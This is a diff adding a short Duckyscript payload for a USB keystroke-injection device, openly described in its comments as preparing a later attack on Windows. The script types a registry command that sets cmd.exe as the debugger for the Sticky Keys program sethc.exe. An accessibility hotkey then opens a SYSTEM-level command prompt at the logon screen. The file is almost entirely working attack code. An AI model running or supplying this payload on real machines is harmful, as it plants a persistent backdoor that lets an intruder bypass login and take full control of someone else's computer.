@@ -1,0 +1,17 @@
+REM Duckyscript to prepare later attack, user should be admin. 
+REM Ok so that's the pre work done now when the users machine 
+REM is logged off and you want to be able to execute commands 
+REM or even if you just want to be able to execute commands as 
+REM the system not as administrator all you need to do is press 
+REM Left Alt + Left Shift + Print Screen.
+REM https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Attacking-Windows-At-The-Logon-Screen,---Gaining-Access-To-CMD-With-System-Privileges.
+DELAY 400
+ESCAPE
+DELAY 200
+CONTROL ESCAPE
+DELAY 750
+STRING cmd.exe /c "reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f"
+DELAY 750
+CTRL-SHIFT ENTER
+DELAY 1000
+ALT y
